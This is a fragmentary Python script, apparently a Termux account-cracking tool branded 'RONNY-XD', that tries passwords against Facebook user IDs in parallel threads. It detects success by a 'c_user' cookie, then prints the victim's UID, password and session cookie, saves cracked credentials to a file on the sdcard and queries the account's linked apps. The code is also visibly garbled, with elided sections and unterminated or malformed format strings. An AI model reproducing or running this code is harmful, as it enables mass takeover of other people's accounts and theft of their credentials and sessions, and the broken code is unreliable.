...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        print(f'\r %s[XMDG,] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
    else:
    ...
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ((ORANGE))
    else:
        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[CODE]---------------------------------------------------[CODE]")
    #____________#
def xyz():
...
def Random():
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE : USER TERMUX\033[0;m]")
    print(f"")
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL ACCOUNT        : {GREEN}"+tl)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\r\033[1;32m[âˆš]---------------------[RONNY-XD]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                cek_apk(session,coki)
                open('/sdcard/Ronny-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[141:156]
                Red = '\033[1;31m'
                print(f'\r{Green}[Ã—]--------------------[RONNY-SORRY PORY]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
